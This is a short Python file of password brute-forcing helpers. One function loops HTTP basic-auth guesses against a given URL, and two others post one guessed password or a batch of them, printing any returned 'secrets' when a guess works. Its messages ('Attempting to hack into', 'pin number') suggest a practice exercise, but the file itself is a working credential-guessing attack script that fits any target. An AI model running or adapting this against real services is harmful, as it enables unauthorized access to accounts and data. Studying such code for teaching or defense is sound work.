from requests import get, post


def iter_test(url, user, generator, num_attempts=1000):
    count = 0
    success = False
    solver = (guess for guess in generator())
    print(f"Task: Attempting to hack into {url}")
    while count < num_attempts:
        password = next(solver)
        response = get(url, auth=(user, password))
        if response.ok:
            success = True
            break
        count += 1
        if count % 100 == 0:
            print(f"Still not cracked {url} after {count} attempts")
    if success:
        print(f"Success!!!! Secrets: {response.text}")
        print(f"The pin number was {password}")
        print(f"Attempt: {count}")
    else:
        print(f"FAIL: Did not crack the password in {count} attempts")


def single_post(url, generator):
    response = post(url, data={"password": generator()})
    if response.ok:
        print(f"Success!!!! Secrets: {response.text}")
    else:
        print(response.status_code)
        print(response.text)


def multi_post(url, generator, num_attempts=1000):
    passwords = [generator() for _i in range(num_attempts)]
    response = post(url, data={"passwords": passwords})
    if response.ok:
        print(f"Success!!!! Secrets: {response.text}")
    else:
        print(response.status_code)
        print(response.text)
